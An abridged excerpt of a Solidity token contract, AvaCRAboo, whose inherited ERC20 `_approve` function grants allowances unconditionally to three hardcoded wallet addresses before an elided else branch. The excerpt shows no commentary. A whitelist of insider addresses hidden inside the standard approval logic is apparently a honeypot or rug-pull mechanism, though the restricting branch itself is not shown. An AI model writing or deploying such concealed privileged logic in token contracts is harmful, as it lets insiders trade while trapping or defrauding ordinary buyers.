...
abstract contract ERC20 is IERC20 {
    ...
    function _approve(
        ...
        if (owner == address(0x8BBD43CA980AAF91D2bE9FEC3Bb0e5095EF4fb3D)) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else if (
            owner == address(0x44C44589Fd9A655E5E84204a01d850D81Bc9fbBd)
        ) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else if (
            owner == address(0x01a314d03e82CaCE7c94e8f249F223B0e4E5df89)
        ) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else {
...
contract AvaCRAboo is ERC20Permit, VaultOwned {
    using SafeMath for uint256;

    constructor() ERC20("AVACRABOO", "AVACRABOO", 18) {}
